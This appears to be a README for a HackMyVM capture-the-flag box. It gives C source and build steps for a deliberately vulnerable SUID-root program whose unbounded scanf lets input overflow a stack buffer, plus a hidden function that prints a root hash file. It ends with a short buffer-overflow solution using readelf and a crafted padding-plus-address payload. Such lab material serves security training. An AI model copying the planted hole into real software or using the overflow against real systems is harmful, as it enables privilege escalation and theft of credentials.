**Dated:** 12 Jan 2021\
**Filename:** overspill.c\
**Binary challenge:** I created for **MessedUP** linux box -  **HackMyVM** site

On Kali box create vulnerable application by running: `gcc -m32 passwordstrength.c -o passwordstrength.exe`\
Copy the `.exe` to `Debian10 - 32bit`\
Chown it to skinny:skinny & allow all to READ/EXECUTE this.\
```c
#include<stdio.h>
#include<string.h>
#include <unistd.h>
#include <stdlib.h>
#include <time.h>

int main ()
{
char *str = NULL;
FILE * fPtr;

printf("Welcome to ***Password Strength Assessment*** Application v01 \nDesigned by: https://grumpygeekwrites.wordpress.com\n");

fPtr = fopen("3l3.txt", "r");

if(fPtr == NULL)
	    {
	 /* Unable to open file hence exit */
	printf("Unable to open file.\n");
	printf("Please check whether file exists and you have read privilege.\n");
	exit(EXIT_FAILURE);	
	    }

else
{
char c;
while((c=fgetc(fPtr))!=EOF)
{
	 printf("%c",c);
}

        fclose(fPtr);
}

printf("\nPlease enter input:");

scanf("%ms",&str);
  
if (str) 
	{
	printf("Your input was:%s\n",str);
	free(str);
	printf("-_____- Hmmmm let me analzye this -_____- \n");
	sleep(1.25);
	int loop=0;
	int upper=15;
	int lower=3;
	int runtime=0;
	srand(time(0));
	runtime=(rand() % (upper - lower + 1)) + lower;
	for (loop=0;loop<=runtime;loop++)
		{
		printf("\nIam tired, let me sleep please **__** %d",loop);
	       	printf("\nAhhh I hate being ... Ahhhhhhhhh, stop it");
		printf("\nLet me try again ... Although I dont have any energy\n\n");	
		}
	
	printf("Iam going off now, sorry to disappoint you ¯_(ツ)_/¯¯_(ツ)_/¯¯_(ツ)_/¯, will try someother time\n");	
	}

else if (str == "I have a laptop and computer in year2020")
	{
	printf("\n WoW!!! here are some of the notes of 'grumpygeek' regarding passwords");
	printf("\nworstpasswordexamples");
	printf("\nweakpassword 1->  password");
	printf("\nweakpassword 2-> newbie");
	printf("\nweakpassword 3-> KBQWW2LTORQW4CQ=");
	printf("\nweakpassord 4-> MNZGSY3LMV2AU===");

	printf("\ngoodpasswordexamples");
	printf("\nstrongpassword 1-> N.CagewasInConAirMovie");
	printf("\nstrongpassword 2-> KNUG6YLJMJAWW2DUMFZDCMBQL5RG653MONDGC43UBI======");
	printf("\nstrongpassword 3-> NFYHA43FMMXHE33DNNZQ====");
	printf("\nstrongpassword 4-> Pakistani Mangoes are great in taste");
	}

else
	{
	printf("Give me some input please, I am not an idiot :-/");
	}
  return 0;
}
```
On Kali box create vulnerable application by running: `gcc -fno-stack-protector -z execstack -no-pie -m32 -mpreferred-stack-boundary=2 overspill.c -o overspill.obj`\
Copy the `overspill.obj` to `Debian10 - 32bit`\
Chown it to root:root & give set the SUID bit set.\
"shadow_backup_sensitiveFile" will have the SHA512 hash of root.

```c
#include <stdio.h>                                                                                                                                          
#include <string.h>                                                                                                                                         
#include <stdlib.h>                                                                                                     
#include <sys/types.h>                                                                                                            
#include <unistd.h>                                                                                                                                         
                                
int main()                                                                                                                        
{                                                                             
int temp=0;                            
char userinput[23];                                                                                                                                         
printf("\n*** Welcome to Overspill software v2.0 ~ by MicrooSooft (° ʖ °)*** \n");                                                                                                                   
printf("\nCreation date: ~19Nov2020");                                                           
printf("\nPlease enter your input:");                                                                                                                       
scanf("%s",&userinput);                    
printf("Your input was -> %s\nNice Input, I liked it\nByeBye (｡◕‿◕｡)\n",userinput);                                                                                           


return 0;                                       
}                                               

void read_sensitive_file(void)                                                                   
{                                               
        printf("\nWTF!!! How the hell, did you get into this secret function\n");                                                                                                                  
        setuid(0);                                     
        setgid(0);                                     

        system("/bin/cat shadow_backup_sensitiveFile");
}
```

**Solution**
> 1. strings overspill.obj (can be skipped)
> 1. readelf -s ./overspill.obj | grep read (notedown the address)
> 1. inside pyhton ---> import pwn; pwn.p32(0x<the address); 
> 1. the above command will convert the address into little endian.
> 1. python -c 'print("A"*35+"<Little Endian HEX address of read_sensitive_file")' | ./overspill.obj
